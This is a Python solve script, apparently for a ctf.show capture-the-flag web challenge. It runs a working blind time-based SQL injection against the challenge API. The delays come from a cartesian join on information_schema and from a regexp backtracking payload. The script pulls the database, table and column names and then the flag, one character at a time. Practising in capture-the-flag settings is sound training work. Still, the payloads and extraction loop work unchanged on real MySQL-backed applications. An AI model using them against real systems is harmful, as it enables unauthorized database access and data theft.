import requests

url = "http://5f889b97-56b0-4132-9a73-397c32f45906.challenge.ctf.show/api/"
result = ""
delay = "concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) regexp concat(repeat('(a.*)+',6),'b')"
cartesian = "(select count(*) from information_schema.columns A, information_schema.columns B, information_schema.schemata)"

"""
payload = f"if(1,{cartesian},0)"
request = requests.post(url=url, data={"ip":payload,"debug":"1"})
print(request.text)
time = request.elapsed.total_seconds()
print(f"{time}")
"""


for i in range(1,50):
    p = 1
    for j in range(32,128):

        payload = f"if(left(database(),{i})='{result+chr(j)}',{cartesian},0)"
        #尝试数据库名
        payload = f"if(left((select table_name from information_schema.tables where table_schema = 'ctfshow_web' limit 0,1),{i}) = '{result+chr(j)}',{cartesian},0)"

        #尝试数据表名
        payload = f"if(left((select column_name from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_flagxcac' limit 1,1), {i}) = '{result+chr(j)}',{cartesian},0)"
        #尝试列名
        payload = f"if(left((select flagaabcc from ctfshow_web.ctfshow_flagxcac limit 0,1), {i}) = '{result+chr(j)}',{cartesian},0)"
        #尝试flag
        re = requests.post(url=url, data={"ip":payload,"debug":"1"})
        #print(re.text)
        time = re.elapsed.total_seconds()
        if time >= 1:
            result = result + chr(j)
            print(f"result:{result}")
            p = 0
            break
    print("1\n")
    if p == 1:
        print("1")
        break
